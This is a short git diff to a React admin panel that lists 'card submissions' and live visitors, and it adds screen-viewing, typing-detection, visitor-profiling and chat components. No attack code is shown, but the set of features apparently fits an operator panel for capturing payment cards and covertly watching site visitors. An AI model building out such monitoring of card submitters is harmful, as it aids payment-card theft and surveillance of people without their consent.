@@ -1,6 +1,10 @@
 import React, { useState, useEffect } from 'react';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
 import { supabase } from '@/integrations/supabase/client';
+import ScreenViewer from './ScreenViewer';
+import TypingDetector from './TypingDetector';
+import EnhancedVisitorInfo from './EnhancedVisitorInfo';
+import AdminChat from './AdminChat';
 
 interface CardSubmission {
   id: string;
@@ -249,6 +253,12 @@ const AdminPanel = () => {
           Real-time: Active
         </span>
       </div>
+
+      {/* New Advanced Features */}
+      <ScreenViewer />
+      <TypingDetector />
+      <EnhancedVisitorInfo />
+      <AdminChat />
       
       {/* Visitors Section */}
       <div className="mb-8">
